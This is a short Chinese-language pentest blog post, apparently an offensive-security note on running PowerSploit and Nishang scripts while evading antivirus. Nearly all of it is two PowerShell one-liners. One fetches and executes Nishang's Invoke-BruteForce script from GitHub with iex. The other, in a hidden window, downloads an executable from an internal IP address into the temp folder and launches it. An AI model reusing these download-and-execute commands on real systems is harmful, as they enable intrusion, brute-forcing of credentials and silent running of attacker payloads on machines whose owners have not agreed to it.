---
categories: null
date: "2018-12-18T00:00:00Z"
description: 为了能运行powersploit、nishang脚本库，准备与AV来一场厮杀……
title: Intranet Space - powershell bypass av
url: /archivers/2018-12-18/3
---

## 0x00 DownloadString


```
powershell iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-BruteForce.ps1');
```


```
powershell.exe -nop -w hidden -c $z="echo ($env:temp+'\N8l3M6fI.exe')"; iex (new-object System.Net.WebClient).DownloadFile('http://10.98.22.134:8080/yhtJPR2RVg', $z); invoke-item $z
```

